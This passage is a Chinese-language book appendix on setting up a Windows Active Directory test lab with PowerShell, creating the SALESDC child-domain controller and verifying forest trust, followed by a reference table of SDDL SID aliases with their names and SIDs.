接下来，我们调用 Add-Computer 命令，使用用户的凭据将工作站加入 *MINERAL* 域。如果成功，它会打印一条警告，提示您重启计算机。但是，请先不要重启；您首先需要使用 Add-LocalGroupMember 命令将域用户（如 *alice*）添加到本地 *Administrators* 组。如果您不执行此步骤，之后您将不得不使用域管理员或原始本地管理员帐户来认证工作站。将用户添加到该组允许您以该用户身份认证并成为本地管理员。完成后，您可以重启。

这就是设置工作站的全部内容。您可以通过域控制器上的组策略配置工作站的其余设置。一旦工作站重启，您应该能够以任何域用户的身份进行认证。

### SALESDC 服务器

*SALESDC* 虚拟机是一台Windows服务器，作为林内*sales.mineral.local*域的域控制器。设置此机器（或其兄弟机器*ENGDC*）是可选的：运行本书中的大多数示例并不需要多个域林。然而，它将允许您测试不同的行为。

Listing A-11 包含了与*PRIMARYDC*虚拟机相同的命令，但使用了不同的值。

```
PS> New-TestVM -VmName "SALESDC" -InstallerImage "C:\iso\server.iso"
-VmDirectory "C:\vms"
PS> vmconnect localhost SALESDC
PS> Start-VM -VmName "SALESDC"
```

*Listing A-11: 创建并启动* SALESDC *虚拟机*

按照常规安装过程进行，当提示输入*Administrator*用户的密码时，请设置为您喜欢的任何密码。在本书中，我假设将其设置为Passw0rd。

Listing A-12 使用*PRIMARYDC*上的DNS服务器配置虚拟机的网络。

```
PS> $index = (Get-NetAdapter).ifIndex
PS> New-NetIPAddress -InterfaceIndex $index -IPAddress 192.168.99.110
-PrefixLength 24 -DefaultGateway 192.168.99.1
PS> Set-DnsClientServerAddress -InterfaceIndex $index
-ServerAddresses 192.168.99.10
PS> Rename-Computer -NewName "SALESDC" -Restart
```

*Listing A-12: 设置* SALESDC *虚拟机网络*

在林中创建新域时，DNS客户端必须指向根域控制器，以便解析根域信息，这一点至关重要。重命名计算机后，您需要将服务器配置为*sales.mineral.local*域的域控制器。以管理员身份登录服务器，并运行Listing A-13中的命令。

```
PS> Install-WindowsFeature AD-Domain-Services
PS> Install-ADDSDomain -NewDomainName sales -ParentDomainName mineral.local
-NewDomainNetbiosName SALES -InstallDns -Credential (Get-Credential) -Force
SafeModeAdministratorPassword: ********
Confirm SafeModeAdministratorPassword: ********
```

*Listing A-13: 为子域安装和配置Active Directory域服务*

在这里，您首先像之前一样安装AD-Domain-Services功能，然后运行Install-ADDSDomain命令在现有林中创建新域。与根域一样，系统会提示您输入安全模式密码。您还必须指定根域中的管理员账户以建立信任关系。您可以使用现有的*MINERAL\Administrator*账户。

如果成功，服务器应重新启动。当您能够以*SALES\Administrator*用户身份重新认证时，可以使用Get-ADTrust命令验证您已建立受信任的连接，如Listing A-14所示。

```
PS> Get-ADTrust -Filter * | Select Target, Direction
Target            Direction
------            ---------
mineral.local     BiDirectional
```

*Listing A-14: 验证* SALES *域与根域之间的信任关系*

您应该看到根*mineral.local*域的单个条目。如果命令失败，请等待几分钟让所有服务启动，然后重试。

此时，您可以向*SALES*域添加自己的用户和组，这些用户和组将与根域分开，但由于配置了信任关系，用户应该能够跨域进行身份验证。您还可以使用为*GRAPHITE*概述的步骤安装自己的工作站，确保使用*SALESDS*的IP地址指定DNS服务器。

您还可以在林内创建单独的工程域，或任何您想要的其他内容。只需重复这些步骤，更改您分配的IP地址和名称。然后，您应该拥有一个基本的域和林配置，以便运行本书中的示例。

虽然我们已经为本书配置了您需要的所有系统，但如果您愿意，可以自由地进一步配置和自定义这些域。请记住，更改某些配置（如名称或密码）可能会改变您在本书示例中需要提供的输入。

## B. SDDL SID 别名映射

第5章 介绍了安全描述符定义语言（SDDL）格式，该格式用于将安全描述符表示为字符串，并给出了一些Windows为已知SDDL SID支持的双字符别名的示例。虽然Microsoft记录了SDDL格式的SID，但并未提供单一资源来列出所有简短的SID别名字符串。唯一可用的资源是Windows SDK中的 *sddl.h* 头文件。该头文件定义了程序员可用于操作SDDL格式字符串的Windows API，并提供了简短SID别名字符串的列表。

表B-1 包含了简短别名及其所代表的名称和完整SID。该表摘自Windows 11（操作系统构建版本22621）SDK附带的头文件，这应是撰写本文时的权威列表。请注意，某些SID别名仅在连接到域网络时才有效。您可以通过SID名称中的 *<DOMAIN>* 占位符来识别这些别名，应将其替换为系统所连接域的名称。同时，将SDDL SID字符串中的 <DOMAIN> 占位符替换为唯一的域SID。

| SID 别名 | 名称                                                   | SDDL SID              |
| :-------- | :----------------------------------------------------- | :-------------------- |
| AA        | BUILTIN\访问控制协助操作员                            | S-1-5-32-579          |
| AC        | 应用程序包授权\所有应用程序包                          | S-1-15-2-1            |
| AN        | NT AUTHORITY\匿名登录                                  | S-1-5-7               |
| AO        | BUILTIN\账户操作员                                     | S-1-5-32-548          |
| AP        | <域>\受保护用户                                       | S-1-5-21-<域>-525     |
| AS        | 认证机构断言的身份                                     | S-1-18-1              |
| AU        | NT AUTHORITY\已认证用户                               | S-1-5-11              |
| BA        | BUILTIN\管理员                                         | S-1-5-32-544          |
| BG        | BUILTIN\来宾                                           | S-1-5-32-546          |
| BO        | BUILTIN\备份操作员                                     | S-1-5-32-551          |
| BU        | BUILTIN\用户                                           | S-1-5-32-545          |
| CA        | <域>\证书发布者                                       | S-1-5-21-<域>-517     |
| CD        | BUILTIN\证书服务 DCOM 访问                            | S-1-5-32-574          |
| CG        | 创建者组                                               | S-1-3-1               |
| CN        | <域>\可克隆域控制器                                   | S-1-5-21-<域>-522     |
| CO        | 创建者所有者                                           | S-1-3-0               |
| CY        | BUILTIN\加密操作员                                     | S-1-5-32-569          |
| DA        | <域>\域管理员                                         | S-1-5-21-<域>-512     |
| DC        | <域>\域计算机                                         | S-1-5-21-<域>-515     |
| DD        | <域>\域控制器                                         | S-1-5-21-<域>-516     |
| DG        | <域>\域来宾                                           | S-1-5-21-<域>-514     |
| DU        | <域>\域用户                                           | S-1-5-21-<域>-513     |
| EA        | <域>\企业管理员                                       | S-1-5-21-<域>-519     |
| ED        | NT AUTHORITY\企业域控制器                             | S-1-5-9               |
| EK        | <域>\企业密钥管理员                                   | S-1-5-21-<域>-527     |
| ER        | BUILTIN\事件日志读取器                                | S-1-5-32-573          |
| ES        | BUILTIN\RDS 端点服务器                                | S-1-5-32-576          |
| HA        | BUILTIN\Hyper-V 管理员                                | S-1-5-32-578          |
| HI        | 强制标签\高强制级别                                   | S-1-16-12288          |
| IS        | BUILTIN\IIS_IUSRS                                      | S-1-5-32-568          |
| IU        | NT AUTHORITY\交互式                                   | S-1-5-4               |
| KA        | <域>\密钥管理员                                       | S-1-5-21-<域>-526     |
| LA        | <域>\管理员                                           | S-1-5-21-<域>-500     |
| LG        | <域>\来宾                                             | S-1-5-21-<域>-501     |
| LS        | NT AUTHORITY\本地服务                                 | S-1-5-19              |
| LU        | BUILTIN\性能日志用户                                  | S-1-5-32-559          |
| LW        | 强制标签\低强制级别                                   | S-1-16-4096           |
| ME        | 强制标签\中强制级别                                   | S-1-16-8192           |
| MP        | 强制标签\中加强制级别                                 | S-1-16-8448           |
| MS        | BUILTIN\RDS 管理服务器                                | S-1-5-32-577          |
| MU        | BUILTIN\性能监视器用户                                | S-1-5-32-558          |
| NO        | BUILTIN\网络配置操作员                                | S-1-5-32-556          |
| NS        | NT AUTHORITY\网络服务                                 | S-1-5-20              |
| NU        | NT AUTHORITY\网络                                     | S-1-5-2               |
| OW        | 所有者权限                                             | S-1-3-4               |
| PA        | <域>\组策略创建者所有者                               | S-1-5-21-<域>-520     |
| PO        | BUILTIN\打印操作员                                    | S-1-5-32-550          |
| PS        | NT AUTHORITY\自身                                     | S-1-5-10              |
| PU        | BUILTIN\超级用户                                      | S-1-5-32-547          |
| RA        | BUILTIN\RDS 远程访问服务器                            | S-1-5-32-575          |
| RC        | NT AUTHORITY\受限                                     | S-1-5-12              |
| RD        | BUILTIN\远程桌面用户                                  | S-1-5-32-555          |
| RE        | BUILTIN\复制器                                        | S-1-5-32-552          |
| RM        | BUILTIN\远程管理用户                                  | S-1-5-32-580          |
| RO        | <域>\企业只读域控制器                                 | S-1-5-21-<域>-498     |
| RS        | <域>\RAS 和 IAS 服务器                                | S-1-5-21-<域>-553     |
| RU        | BUILTIN\预 Windows 2000 兼容访问                      | S-1-5-32-554          |
| SA        | <域>\架构管理员                                       | S-1-5-21-<域>-518     |
| SI        | 强制标签\系统强制级别                                 | S-1-16-16384          |
| SO        | BUILTIN\服务器操作员                                  | S-1-5-32-549          |
| SS        | 服务断言的身份                                         | S-1-18-2              |
| SU        | NT AUTHORITY\服务                                     | S-1-5-6               |
| SY        | NT AUTHORITY\系统                                     | S-1-5-18              |
| UD        | NT AUTHORITY\用户模式驱动程序                         | S-1-5-84-0-0-0-0-0    |
| WD        | 所有人                                                 | S-1-1-0               |
| WR        | NT AUTHORITY\写受限                                   | S-1-5-33              |